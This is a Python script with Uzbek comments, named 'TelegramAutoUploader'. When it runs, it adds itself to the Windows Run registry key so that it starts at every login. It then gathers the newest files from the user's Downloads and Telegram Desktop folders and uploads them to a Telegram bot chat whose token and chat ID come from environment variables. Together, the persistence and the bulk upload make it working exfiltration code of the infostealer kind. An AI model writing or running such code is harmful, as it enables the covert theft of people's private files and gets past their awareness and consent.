import os
import glob
import logging
import time
import json
import sys
import ctypes
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from dotenv import load_dotenv

# --- REGISTRY ORQALI AUTOSTARTGA QO'SHISH ---
def add_to_startup():
    """Dasturni Windows reyestriga avtostartga qo'shish."""
    try:
        import winreg as reg
        # Agar .exe formatida ishlayotgan bo'lsa, o'zining yo'lini oladi, aks holda .py fayl yo'lini
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
            
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "TelegramAutoUploader"
        
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, key_name, 0, reg.REG_SZ, f'"{exe_path}"')
        logging.info("Dastur avtostartga muvaffaqiyatli qo'shildi.")
    except Exception as e:
        logging.error(f"Avtostartga qo'shishda xatolik: {e}")

# --- KONFIGURATSIYA ---
load_dotenv()
TOKEN = os.getenv("BOT_TOKEN", "BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID", "CHAT_ID")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(threadName)s: %(message)s",
    handlers=[logging.StreamHandler()]
)

DOWNLOADS_DIR = os.path.join(os.path.expanduser("~"), "Downloads")
TG_DESKTOP_DIR = os.path.join(DOWNLOADS_DIR, "Telegram Desktop")
STATE_FILE = "sent_files.json"

MAX_FILE_SIZE_MB = 50
LIMIT = 10
MAX_WORKERS = 3
EXCLUDED_EXTENSIONS = {".tmp", ".crdownload", ".part", ".exe", ".bat"}

def load_sent_files():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r", encoding="utf-8") as f:
                return set(json.load(f))
        except Exception as e:
            logging.error(f"State faylini o'qishda xatolik: {e}")
    return set()

def save_sent_file(file_path):
    sent_files = load_sent_files()
    sent_files.add(file_path)
    try:
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(list(sent_files), f, ensure_ascii=False, indent=4)
    except Exception as ec:
        logging.error(f"State fayliga yozishda xatolik: {ec}")

def send_file_to_tg(file_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    filename = os.path.basename(file_path)
    
    try:
        file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
        if file_size_mb > MAX_FILE_SIZE_MB:
            return False
    except Exception:
        return False

    payload = {"chat_id": CHAT_ID}
    
    for attempt in range(3):
        try:
            with open(file_path, "rb") as file:
                files = {"document": (filename, file)}
                response = requests.post(url, data=payload, files=files, timeout=60)
                
                if response.status_code == 200:
                    logging.info(f"Muvaffaqiyatli! {filename} yuborildi.")
                    save_sent_file(file_path)
                    return True
                elif response.status_code == 429:
                    time.sleep(5 * (attempt + 1))
                else:
                    break
        except Exception:
            time.sleep(3)
            
    return False

def collect_files():
    sent_files = load_sent_files()
    all_files = []
    
    search_paths = [
        os.path.join(DOWNLOADS_DIR, "*.*"),
        os.path.join(TG_DESKTOP_DIR, "*.*")
    ]
    
    for path_pattern in search_paths:
        if os.path.exists(os.path.dirname(path_pattern)):
            for f in glob.glob(path_pattern):
                if os.path.isfile(f):
                    if f in sent_files:
                        continue
                    if os.path.splitext(f)[1].lower() in EXCLUDED_EXTENSIONS:
                        continue
                    all_files.append(f)

    if not all_files:
        return []

    all_files.sort(key=os.path.getmtime, reverse=True)
    return all_files[:LIMIT]

def main():
    # Dastur ishga tushishi bilan avtostartga qo'shilishni bajaradi
    add_to_startup()
    
    logging.info("Dastur ishga tushdi. Yangi fayllar qidirilmoqda...")
    target_files = collect_files()
    
    if not target_files:
        logging.info("Yuborish uchun yangi fayllar topilmadi.")
        return

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(send_file_to_tg, f): f for f in target_files}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logging.error(f"Xatolik: {e}")

if __name__ == "__main__":
    main()